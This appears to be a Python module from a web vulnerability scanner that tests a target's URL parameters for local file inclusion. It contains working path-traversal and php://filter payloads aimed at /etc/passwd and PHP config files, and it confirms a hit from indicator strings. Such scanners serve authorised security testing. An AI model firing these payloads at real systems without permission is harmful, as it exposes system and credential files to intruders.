from concurrent.futures import ThreadPoolExecutor, as_completed

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "../../../etc/hosts",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "file:///etc/passwd",
    "/etc/passwd",
]

LFI_INDICATORS = [
    "root:", "/bin/bash", "daemon:", "nobody:", "www-data:",
    "[fonts]", "127.0.0.1", "localhost",
]

LFI_PARAMS = [
    "file", "page", "include", "path", "doc", "document",
    "folder", "root", "load", "read", "show", "view",
    "content", "template", "default", "name", "url", "pg",
]


def lfi_check(engine):
    engine._log("INFO", f"Starting LFI detection on {engine.target_url}")
    results = []

    params = engine.extract_params()
    if not params:
        params = LFI_PARAMS[:5]

    def test_param(param):
        baseline_text = engine.get_baseline_text(param)
        if baseline_text is None:
            return None

        for payload in LFI_PAYLOADS:
            args = engine.build_request_args(param, payload)
            resp = engine.request(**args)
            if resp is None:
                continue

            resp_text = resp.text
            indicators = [i for i in LFI_INDICATORS if i in resp_text]

            if indicators:
                baseline_hits = [i for i in LFI_INDICATORS if baseline_text and i in baseline_text]
                new_hits = [i for i in indicators if i not in baseline_hits]
                if new_hits:
                    engine._log("VULN", f"LFI confirmed in '{param}' with payload: {payload}")
                    engine._log("VULN", f"  Indicators (not in baseline): {new_hits}")
                    return {
                        "parameter": param,
                        "payload": payload,
                        "indicators": new_hits,
                        "size": len(resp.content),
                    }
        return None

    with ThreadPoolExecutor(max_workers=engine.threads) as pool:
        futures = {pool.submit(test_param, p): p for p in params}
        for future in as_completed(futures):
            try:
                r = future.result(timeout=60)
                if r:
                    r["status"] = 200
                    results.append(r)
            except Exception:
                pass

    engine.results["lfi"] = results
    engine._log("INFO", f"LFI detection complete. Confirmed: {len(results)}.")
    return results
